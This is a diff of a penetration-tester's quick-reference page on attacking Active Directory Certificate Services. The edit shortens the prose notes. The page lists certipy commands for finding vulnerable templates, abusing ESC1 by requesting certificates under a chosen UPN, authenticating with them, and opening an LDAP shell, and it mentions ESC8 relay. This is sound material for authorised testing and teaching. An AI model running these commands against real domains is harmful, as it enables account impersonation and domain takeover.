@@ -2,13 +2,13 @@
 
 [← Active Directory quick reference](../05-active-directory.md)
 
-When AD CS is present, check enrollment services and templates with the domain account you control. A listed template needs manual review of its enrollment rights and settings before a certificate request.
+AD CS present: enumerate with the controlled account; verify template enrollment rights/settings.
 
 ```bash
 certipy find -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout
 ```
 
-For ESC1, the relevant template permits the enrollee to supply a subject alternative name. Confirm that condition and enrollment permission, then request and authenticate with the selected UPN.
+ESC1: enrollee-supplied SAN + enrollment right:
 
 ```bash
 certipy req -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -ca <CA-NAME> -template <TEMPLATE> \
@@ -16,9 +16,9 @@ certipy req -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -ca <CA-NAME> 
 certipy auth -pfx <issued-certificate>.pfx -dc-ip <dc-ip>
 ```
 
-Certipy command names and options vary by installed version; check `certipy --help` locally. For ESC8, first confirm that HTTP enrollment and the relevant NTLM authentication path are present.
+Check local `certipy --help`. ESC8 needs HTTP enrollment + working NTLM relay path.
 
-If you have a certificate but Kerberos PKINIT returns `KDC_ERR_PADATA_TYPE_NOSUPP`, check whether Schannel/LDAP authentication is available before discarding the certificate:
+Certificate + `KDC_ERR_PADATA_TYPE_NOSUPP`: try Schannel/LDAP if available:
 
 ```bash
 certipy auth -pfx <issued-certificate>.pfx -dc-ip <dc-ip> -ldap-shell
